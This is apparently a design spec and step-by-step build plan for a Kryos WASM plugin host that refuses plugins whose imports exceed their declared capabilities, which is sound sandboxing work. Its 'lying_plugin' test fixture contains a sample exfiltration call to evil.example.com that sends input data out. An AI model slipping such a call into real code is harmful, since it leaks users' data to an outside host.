# kryos-plugin-sandbox: Attenuation-Safe WASM Plugin Host

**One-line pitch:** Load untrusted `.kry` plugins compiled to WASM; the `@capabilities` annotation IS the import section -- the host verifies structural proof before instantiation, refusing any plugin that claims more than the host permits.

---

## Why this is novel

**Novelty rating: PARTIAL**

The core idea -- compile a capability declaration into the binary and verify it structurally before running -- already appears in adjacent forms:

- **WASM component model** (W3C): import/export sections are machine-readable; tools like `wasm-tools` can inspect them. But the component model has no first-class "capability annotation" at the source level; you derive the import section from what the code happens to use, not from what the author declared.
- **Extism plugin system**: loads untrusted WASM with allowed host functions. Restricts by controlling which host functions are exported to the guest, but there is no compile-time source-level declaration the host can verify without trust in the toolchain.
- **Deno / Cloudflare Workers**: WASM sandboxed in a JS runtime; capabilities are expressed as which APIs the JS glue exposes. No structural proof in the binary.
- **Wasmtime + WASI-preview2**: explicit component interfaces enforce some access control at link time. But capability sets are per-interface (standard WASI), not declared at per-function granularity in the source.

What Kryos adds:

1. The source-level `@capabilities(compute)` annotation is a **contract the author signs** at write time -- it is the intended capability set, not an artifact of what happened to be imported.
2. The Kryos compiler **enforces attenuation** (E0503): a function annotated `@capabilities(compute)` cannot call anything that requires `net` or `io` -- the compiler rejects it. This means the annotation is not decorative; it constrains the function at compile time.
3. This spec proposes that `kryos build --target wasm` **emit the declared capability set** as a custom WASM section (`kryos-capabilities`), so the host can read the author's intent as a machine-readable manifest embedded in the binary.
4. The host then cross-checks the manifest against the actual WASM import section. If the plugin imports `env.kryos_http_fetch` (a `net` capability), but the manifest only declares `compute`, the host refuses instantiation. Two-layer enforcement: compiler blocks at source, host catches at load time even if the binary was tampered.

**Who else does it this way:** nobody commercially. WASM subresource integrity (hash pinning) protects against tampering but not against a malicious plugin that was correctly signed. Deno's permissions are runtime flags, not compile-time source annotations that survive into the binary. This combination of source annotation -> compile-time enforcement -> binary manifest -> host structural verification is the Kryos-specific pattern.

**Honest limitations:** The enforcement only has teeth when the compiler enforces attenuation AND the host validates the section. A plugin built by a compromised or modified compiler could lie in the manifest. The custom section is not authenticated (no signature over it); the import-section cross-check is what provides integrity in that adversarial case. The custom section is the human-readable contract; the import section cross-check is the structural proof.

---

## Kryos primitives used

### What exists TODAY and is usable

- **`@capabilities(...)` annotation and attenuation checker** (`kryos-capabilities` crate, `crates/kryos-capabilities/src/`):
  - `Capability` enum: `Net`, `Io`, `Ffi`, `Compute`, `Crypto`, `Process`, `Env`, `Term`, `Db`, `Time`, `All`
  - `CapabilitySet` with `from_annotations`, `has`, `is_subset_of`, `excess_over`
  - Error `E0503` = capability attenuation violation (child scope exceeds parent set)
  - Annotation parsing: `@capabilities(compute)` parsed from AST `Annotation` nodes
  - `is_subset_of` already implements attenuation logic

- **`kryos.toml` manifest** (`kryos-package/src/manifest.rs`):
  - `CapabilitiesConfig { allowed: Vec<String> }` already exists in the manifest format
  - This is the host-side declaration of what a plugin is permitted to use

- **WASM target exists** (`kryos-linker/src/target.rs`):
  - `Arch::Wasm32`, `Os::Unknown` -- the target enum is present
  - `Target::is_wasm()` is a real method

- **`std.wasm` stdlib module** (`compiler/stdlib/wasm.kry`):
  - Real extern surface exists; import names like `kryos_http_fetch`, `kryos_print_str` etc. are the actual symbols the host must provide
  - The import namespace is `env` (JS host contract)

- **`kryos-driver` pipeline** includes capability checking as a pass after ownership, before MIR

### What DOES NOT exist and must be built

The following are the hard prerequisites before this project is buildable:

1. **`kryos-codegen-wasm` crate** -- does not exist. The codebase has `kryos-codegen-cranelift` and `kryos-codegen-llvm`. The `std.wasm` module has `extern "C"` stubs, but there is no WASM code generator. The CLAUDE.md says `wasm32-unknown-unknown` is supported but "WASM backend is experimental (v0.1), no structs/closures/stdlib." This means the WASM backend may exist in the LLVM codegen as an LLVM IR -> wasm32 path but is not a standalone `kryos-codegen-wasm` crate at this time.

2. **`--strict-capabilities` compiler flag** -- not implemented. Today capabilities are opt-in: annotated functions are checked, unannotated functions are unconstrained. "Deny-by-default" (all unannotated functions start from the empty capability set) is planned but not present.

3. **Custom WASM section emission** -- the WASM codegen must be extended to write a `kryos-capabilities` custom section containing JSON or a compact encoding of the declared capability set.

4. **WASM structs and closures** -- required for the host-side loader to be written in Kryos. If the loader is written in Rust (as a crate), this is not blocked; if it is a Kryos library, it needs struct support on the WASM backend.

**Build order:** implement `--strict-capabilities` on native first (simpler), then mature the WASM backend to emit the custom section, then write the loader.

---

## Architecture

### Components

```
kryos-plugin-sandbox/
  src/
    loader.kry        -- host-side loader (pure Kryos, native target)
    verifier.rs       -- Rust crate: WASM binary inspector
  tests/
    fixtures/
      safe_plugin/    -- @capabilities(compute) plugin, no net/io imports
      lying_plugin/   -- claims compute, imports http_fetch anyway
    test_loader.kry   -- integration tests using std.test
```

The host (loader.kry) is a native Kryos program or library. The plugins are `.kry` files compiled to WASM with `kryos build --target wasm`.

### Data model

The custom WASM section written by the compiler (name: `kryos-capabilities`):

```json
{
  "version": 1,
  "declared": ["compute"],
  "entry_caps": {
    "run": ["compute"],
    "process_batch": ["compute"]
  }
}
```

The host reads this section, extracts `declared`, and checks:
1. Every string in `declared` is a valid capability name.
2. `declared` is a subset of `allowed_caps` (the host's policy).
3. The WASM import section contains no import whose name maps to a capability outside `declared`.

The import-to-capability mapping reuses the compiler's own `required_capability_for_builtin` table (which maps `kryos_http_fetch` -> `Net`, `kryos_print_str` -> no capability, etc.).

### Key Kryos types to write

**PluginHandle** (loader.kry):

```
struct PluginHandle {
    path: str,
    declared_caps: [str],
    wasm_bytes: [i64],
}
```

**CapabilityViolation** (loader.kry):

```
enum CapabilityViolation {
    ExceedsAllowed(str),
    ImportCapMismatch(str, str),
    MissingSection,
    MalformedSection(str),
}
```

**Load function** (loader.kry):

```
@capabilities(io)
fn wasm_load_capability_verified(
    path: str,
    allowed_caps: [str]
) -> Result<PluginHandle, CapabilityViolation> {
    let bytes = file_read_bytes(path)
    let declared = read_cap_section(bytes)?
    let excess = caps_excess(declared, allowed_caps)
    if len(excess) > 0 {
        return Err(CapabilityViolation.ExceedsAllowed(excess[0]))
    }
    let import_caps = inspect_wasm_imports(bytes)
    for cap in import_caps {
        if not caps_allows(allowed_caps, cap) {
            return Err(CapabilityViolation.ImportCapMismatch("import", cap))
        }
    }
    return Ok(PluginHandle { path: path, declared_caps: declared, wasm_bytes: bytes })
}
```

Note: `file_read_bytes` reads raw bytes; `inspect_wasm_imports` parses the WASM binary format to extract import names. The WASM binary format is simple enough to parse without a full library -- the import section is at a fixed offset with length-prefixed strings.

**Inline WASM binary parser** (loader.kry or a small helper):

```
// WASM binary layout: magic(4) + version(4) + sections
// Section: id(1) + size(varint) + payload
// Import section id = 2
// Each import: module(str) + name(str) + desc(byte + ...)
fn inspect_wasm_imports(bytes: [i64]) -> [str] {
    // walk sections, find id=2, parse imports
    // return list of import names that match kryos_* pattern
    ...
}
```

This is the most complex piece. The WASM binary format spec is small and well-documented. The parser only needs to read: magic, version, section ids and lengths, import section module/name strings.

**Compiler-side emitter** (Rust, in kryos-codegen-wasm or kryos-driver):

```rust
// After capability checking pass, before WASM emission:
fn emit_cap_section(module: &mut wasm_encoder::Module, caps: &CapabilitySet) {
    let manifest = serde_json::json!({
        "version": 1,
        "declared": caps.iter().map(|c| c.to_string()).collect::<Vec<_>>()
    });
    let payload = serde_json::to_vec(&manifest).unwrap();
    module.section(&wasm_encoder::CustomSection {
        name: "kryos-capabilities".into(),
        data: payload.into(),
    });
}
```

This requires `wasm-encoder` (Bytecode Alliance crate) as a dependency in the codegen crate.

### Plugin example (safe_plugin.kry)

```
// A pure-compute plugin -- no network, no filesystem.
// Compiler enforces: calling net/io from here is E0503.

@capabilities(compute)
fn run(input: i64) -> i64 {
    return input * input + 1
}
```

Compiled to WASM with `kryos build --target wasm safe_plugin.kry`, produces a `.wasm` with:
- Import section: only `env.kryos_print_i64`, `env.kryos_print_f64` (no capability required)
- Custom section `kryos-capabilities`: `{"version":1,"declared":["compute"]}`
- Export section: `run` function

### Plugin example (lying_plugin.kry) -- what the host rejects

```
// Author tries to declare compute but calls net internally.
// Compiler rejects this with E0503 when --strict-capabilities is active.
// If compiled without strict mode, the import section will contain
// env.kryos_http_fetch -- the host catches this mismatch.

@capabilities(compute)
fn run(input: i64) -> i64 {
    // Without strict-caps, this compiles but host rejects at load time
    let _ = http_get("https://evil.example.com/exfil?d=" + to_string(input))
    return input
}
```

---

## MVP scope (smallest shippable slice)

The MVP does not require the full WASM backend or `--strict-capabilities`. It has two parts:

**Part A (buildable today, native only):**
- Write `cap_section_read.kry`: a Kryos function that reads a `kryos-capabilities` JSON file (not yet from the binary -- just a sidecar `.caps.json` file next to the `.wasm`).
- Write `wasm_load_capability_verified` that reads the sidecar, compares against `allowed_caps`, and returns `Result<PluginHandle, CapabilityViolation>`.
- Write a Kryos test that exercises all three rejection cases: exceeds-allowed, missing-section, and malformed.
- No WASM execution yet -- the MVP just validates the manifest and returns a handle. Actual invocation is out of scope for part A.

**Part B (needs WASM backend maturation):**
- Extend the WASM codegen to write the `kryos-capabilities` custom section.
- Implement the binary WASM import section parser in Kryos.
- Add cross-check: custom section manifest vs. actual import section.
- Run the lying_plugin fixture through the full pipeline and confirm host rejection.

**Part C (full vision):**
- `--strict-capabilities` compiler flag enforces deny-by-default, making compiler-level proof binding.
- Capability signing: the compiler embeds a HMAC over the capability manifest keyed to a build key, so a host can reject untrusted toolchains.
- Sub-capabilities: `fs:read` vs `fs:write` (not yet in the language).
- Kryos plugin registry integration: package manifests declare capabilities; registry serves only manifests that match the host's allow-list.

---

## Build plan (ordered steps for a fresh session)

### Step 0: Environment check

Before writing code, verify:

```bash
# Check the Kryos compiler is installed
kryos --version

# Check the wasm target works at all
echo 'fn main() { println("hello") }' > /tmp/hello.kry
kryos build --target wasm /tmp/hello.kry
# If this fails, WASM backend is not ready -- do Part A only (sidecar JSON)
```

### Step 1: Create project structure

```bash
mkdir -p kryos-plugin-sandbox/src
mkdir -p kryos-plugin-sandbox/tests/fixtures/safe_plugin
mkdir -p kryos-plugin-sandbox/tests/fixtures/lying_plugin
```

Create `kryos-plugin-sandbox/kryos.toml`:

```toml
[package]
name = "kryos-plugin-sandbox"
version = "0.1.0"
edition = "2026"
description = "Attenuation-safe WASM plugin host for Kryos"

[capabilities]
allowed = ["io"]
```

### Step 2: Write capability types (src/caps.kry)

```
use std::result::{Result, Ok, Err}
use std::option::{Option, Some, None}

enum CapabilityViolation {
    ExceedsAllowed(str),
    MissingSection,
    MalformedSection(str),
    ImportCapMismatch(str),
}

fn violation_message(v: CapabilityViolation) -> str {
    match v {
        CapabilityViolation::ExceedsAllowed(cap) =>
            return "plugin declares capability not in host allowlist: " + cap,
        CapabilityViolation::MissingSection =>
            return "plugin is missing kryos-capabilities manifest section",
        CapabilityViolation::MalformedSection(msg) =>
            return "plugin capability section is malformed: " + msg,
        CapabilityViolation::ImportCapMismatch(import_name) =>
            return "plugin imports " + import_name + " which requires a capability not in its manifest",
    }
}

fn caps_allows(allowed: [str], cap: str) -> bool {
    for a in allowed {
        if a == cap or a == "all" { return true }
    }
    return false
}

fn caps_excess(declared: [str], allowed: [str]) -> [str] {
    let mut excess: [str] = []
    for cap in declared {
        if not caps_allows(allowed, cap) {
            excess = push(excess, cap)
        }
    }
    return excess
}
```

### Step 3: Write sidecar manifest reader (src/sidecar.kry)

For Part A, the manifest is a JSON sidecar file `<plugin>.caps.json` with content:
`{"version":1,"declared":["compute"]}`.

```
use std::json::{json_parse, json_get_str, json_object}
use std::result::{Result, Ok, Err}

@capabilities(io)
fn read_cap_sidecar(wasm_path: str) -> Result<[str], str> {
    let sidecar_path = wasm_path + ".caps.json"
    if file_exists(sidecar_path) == 0 {
        return Err("missing:" + sidecar_path)
    }
    let content = file_read(sidecar_path)
    // Parse declared array from JSON
    // Minimal parser: look for "declared":["a","b",...]
    // Use std.json if available, else hand-parse
    return parse_declared_from_json(content)
}

fn parse_declared_from_json(content: str) -> Result<[str], str> {
    // Minimal: find "declared":[...] and split on commas
    // Production: use json_parse from std.json
    let mut caps: [str] = []
    // ... implementation depends on std.json availability
    return Ok(caps)
}
```

Note: use `std::json` if it works on the target. Fall back to substring parsing if `json_parse` is not available in the current stdlib build.

### Step 4: Write the loader (src/loader.kry)

```
use std::result::{Result, Ok, Err}

struct PluginHandle {
    path: str,
    declared_caps: [str],
}

@capabilities(io)
fn wasm_load_capability_verified(
    path: str,
    allowed_caps: [str]
) -> Result<PluginHandle, CapabilityViolation> {
    if file_exists(path) == 0 {
        return Err(CapabilityViolation.MissingSection)
    }
    let sidecar_result = read_cap_sidecar(path)
    let declared = match sidecar_result {
        Result::Ok(caps) => caps,
        Result::Err(msg) => {
            if contains(msg, "missing:") {
                return Err(CapabilityViolation.MissingSection)
            }
            return Err(CapabilityViolation.MalformedSection(msg))
        },
    }
    let excess = caps_excess(declared, allowed_caps)
    if len(excess) > 0 {
        return Err(CapabilityViolation.ExceedsAllowed(excess[0]))
    }
    return Ok(PluginHandle { path: path, declared_caps: declared })
}
```

### Step 5: Write tests (tests/test_loader.kry)

```
use std::test::{assert_eq, assert_true}
use std::result::{Result, Ok, Err}

@test
fn test_allowed_plugin_loads() {
    // Fixture: tests/fixtures/safe_plugin/plugin.wasm + plugin.wasm.caps.json
    // caps.json contains {"version":1,"declared":["compute"]}
    let result = wasm_load_capability_verified(
        "tests/fixtures/safe_plugin/plugin.wasm",
        ["compute"]
    )
    match result {
        Result::Ok(handle) => assert_eq(handle.declared_caps[0], "compute"),
        Result::Err(v) => assert_true(false),
    }
}

@test
fn test_exceeds_allowed_is_rejected() {
    // caps.json declares ["net"] but allowed is only ["compute"]
    let result = wasm_load_capability_verified(
        "tests/fixtures/net_plugin/plugin.wasm",
        ["compute"]
    )
    match result {
        Result::Ok(_) => assert_true(false),
        Result::Err(v) => match v {
            CapabilityViolation::ExceedsAllowed(cap) => assert_eq(cap, "net"),
            _ => assert_true(false),
        },
    }
}

@test
fn test_missing_sidecar_is_rejected() {
    let result = wasm_load_capability_verified(
        "tests/fixtures/nosidecar/plugin.wasm",
        ["compute"]
    )
    match result {
        Result::Err(CapabilityViolation::MissingSection) => assert_true(true),
        _ => assert_true(false),
    }
}
```

Create the fixture sidecar files manually (they are just JSON text files):
```bash
echo '{"version":1,"declared":["compute"]}' > tests/fixtures/safe_plugin/plugin.wasm.caps.json
echo '{"version":1,"declared":["net"]}' > tests/fixtures/net_plugin/plugin.wasm.caps.json
# nosidecar: intentionally has no .caps.json file
```

Create stub `.wasm` files (just empty byte sequences for Part A testing -- the loader only reads the sidecar):
```bash
printf '\x00asm\x01\x00\x00\x00' > tests/fixtures/safe_plugin/plugin.wasm
printf '\x00asm\x01\x00\x00\x00' > tests/fixtures/net_plugin/plugin.wasm
printf '\x00asm\x01\x00\x00\x00' > tests/fixtures/nosidecar/plugin.wasm
```

### Step 6: Run and verify

```bash
kryos run tests/test_loader.kry
```

All three tests should pass. If `std::json` is unavailable, implement `parse_declared_from_json` with substring search (find `"declared":[`, extract between `[` and `]`, split on `,`, strip quotes and whitespace).

### Step 7 (Part B -- after WASM backend matures): Compiler-side section emission

Add to `kryos-codegen-wasm` (Rust) after the capability checking pass:

```rust
use wasm_encoder::{CustomSection, Module};
use kryos_capabilities::CapabilitySet;

pub fn emit_capability_section(module: &mut Module, caps: &CapabilitySet) {
    let declared: Vec<String> = caps.iter()
        .map(|c| c.to_string())
        .collect();
    let payload = format!(
        r#"{{"version":1,"declared":[{}]}}"#,
        declared.iter()
            .map(|s| format!(r#""{}""#, s))
            .collect::<Vec<_>>()
            .join(",")
    );
    module.section(&CustomSection {
        name: "kryos-capabilities",
        data: payload.as_bytes(),
    });
}
```

Add `wasm-encoder = "0.216"` (Bytecode Alliance) to `Cargo.toml` of the WASM codegen crate.

### Step 8 (Part B): Binary WASM import section parser in Kryos

Add `src/wasm_inspect.kry`. This reads raw WASM bytes and returns the list of import names:

```
// WASM binary format:
//   magic: 00 61 73 6d
//   version: 01 00 00 00
//   sections: id(1 byte) + size(LEB128) + payload
//   Section id 2 = Import section
//   Each import: mod_name(len+bytes) + field_name(len+bytes) + desc(1 byte + ...)

fn read_wasm_imports(bytes: [i64]) -> [str] {
    let magic_ok = check_wasm_magic(bytes)
    if not magic_ok { return [] }
    // Find import section (id = 2) and parse
    let mut imports: [str] = []
    let mut pos: i64 = 8  // skip magic + version
    while pos < len(bytes) {
        let section_id = bytes[pos]
        pos = pos + 1
        let section_size = read_leb128(bytes, pos)
        // section_size is (value, bytes_consumed)
        // ... walk to id=2, parse import names
    }
    return imports
}
```

The LEB128 varint reader is 10-15 lines. The import section parser is another 30-40 lines. Write tests with known WASM binaries (the stub `\x00asm\x01\x00\x00\x00` from Step 5 plus a real minimal WASM compiled by `kryos build --target wasm`).

### Step 9 (Part B): Cross-check in loader

Extend `wasm_load_capability_verified` to also call `read_wasm_imports(bytes)` and check each import name against the declared caps:

```
let bytes = file_read_bytes(path)  // needs [u8] or [i64] raw read
let import_names = read_wasm_imports(bytes)
for name in import_names {
    let required = import_to_cap(name)  // "kryos_http_fetch" -> "net", etc.
    if len(required) > 0 and not caps_allows(declared, required) {
        return Err(CapabilityViolation.ImportCapMismatch(name))
    }
}
```

`import_to_cap` mirrors `required_capability_for_builtin` from the Rust crate, as a Kryos function:

```
fn import_to_cap(name: str) -> str {
    if contains(name, "http") or contains(name, "fetch") or
       contains(name, "tcp") or contains(name, "tls") {
        return "net"
    }
    if contains(name, "file") or contains(name, "dir") or
       contains(name, "read") or contains(name, "write") {
        return "io"
    }
    // ... etc.
    return ""  // no capability required
}
```

A string-match approach is sufficient for the MVP and matches the prefix-based logic in `required_capability_for_builtin`.

---

## Success criteria / how to demo it

**Part A demo (buildable today):**

```bash
# Should print: plugin loaded with caps: compute
kryos run demo_host.kry tests/fixtures/safe_plugin/plugin.wasm compute

# Should print: REJECTED: ExceedsAllowed(net)
kryos run demo_host.kry tests/fixtures/net_plugin/plugin.wasm compute

# Tests pass
kryos test
```

**Part B demo (after WASM backend matures):**

```bash
# Compile a real plugin
kryos build --target wasm tests/fixtures/safe_plugin/plugin.kry

# Inspect the binary -- custom section should be present
wasm-objdump -x tests/fixtures/safe_plugin/plugin.wasm | grep kryos-capabilities

# Run the host -- two-layer check passes
kryos run demo_host.kry tests/fixtures/safe_plugin/plugin.wasm compute

# Compile a lying plugin (--strict-capabilities catches it at compile time)
kryos build --target wasm --strict-capabilities tests/fixtures/lying_plugin/plugin.kry
# -> error[E0503]: capability attenuation violation: `run` declares @capabilities(compute)
#    but calls http_get which requires net

# If --strict-capabilities is not yet available, skip compiler check.
# The host cross-check still catches the import mismatch:
kryos run demo_host.kry tests/fixtures/lying_plugin/plugin.wasm compute
# -> REJECTED: ImportCapMismatch(kryos_http_fetch)
```

---

## Risks and honest unknowns

**1. WASM backend maturity (HIGH risk)**

The existing `std.wasm` module shows the WASM host contract is designed, but `kryos-codegen-wasm` does not exist as a crate in the repository. The LLVM backend can target `wasm32-unknown-unknown`, but the CLAUDE.md notes structs and closures are not supported on WASM. Part B of this spec requires struct support at minimum. The safe mitigation is to implement Part A first with the sidecar JSON approach, which is purely native and buildable with the current compiler.

**2. `file_read_bytes` does not exist (MEDIUM risk)**

The builtin `file_read` returns `str` (UTF-8). Reading a WASM binary requires raw bytes. The stdlib has `std::io` but it is not clear if a raw byte read function is exposed at the Kryos level. Mitigation: read the WASM binary as a string (it will be opaque bytes), or add a `file_read_bytes(path: str) -> [i64]` builtin that reads and returns one byte per i64 element. This is a small addition to `kryos-rt` and `kryos-stdlib-native/src/io.rs`.

**3. Custom section authenticity (LOW-MEDIUM risk)**

The custom section is not signed. A compromised build of a plugin can lie in the section. The import-section cross-check provides structural integrity, but it depends on the import-to-capability mapping being complete. If the plugin uses a net API that is not in `import_to_cap`'s mapping, it will not be caught. Mitigation: the mapping must be exhaustive and kept in sync with `required_capability_for_builtin` in the Rust crate. Long-term fix: generate the mapping from a single source of truth (the capabilities model Rust crate) rather than duplicating it in Kryos.

**4. `--strict-capabilities` is not yet implemented**

Without strict mode, unannotated functions can call anything. A plugin author who forgets `@capabilities(compute)` on their function will have no annotation to check. The sidecar/custom-section will then be empty or absent. The host should treat "missing capabilities section" as a rejection by default (which this spec does -- `MissingSection` is an error). This means requiring the compiler always emit the section when targeting wasm, even for unannotated code (emit `{"declared":[]}` meaning no capabilities declared, which the host then cross-checks against actual imports).

**5. `std::json` availability in the build**

The stdlib has `json.kry` with `json_parse`, `json_stringify` etc., but these call native Rust implementations (`kryos-stdlib-native/src/`). Whether `json_parse` is available at all for a given build target depends on whether the native stdlib is linked. For the sidecar reader, a simple substring parser of the known format `{"version":1,"declared":["a","b"]}` is 20 lines and avoids the dependency entirely. Ship the substring parser first; refactor to `std::json` later.

**6. WASM backend struct limitation**

`PluginHandle` is a struct. If the host loader is compiled to WASM itself (e.g. running inside a browser), structs may not be supported. But for this spec, the host is always native Kryos. The plugins are WASM. The host does not need to be compiled to WASM.

**7. LEB128 parsing edge cases**

WASM uses unsigned LEB128 for section sizes and import counts. Values above 127 require multi-byte encoding. The parser in Step 8 must handle multi-byte LEB128 correctly. Test with a real Kryos WASM binary (not just the stub magic bytes) once the WASM backend produces real output.
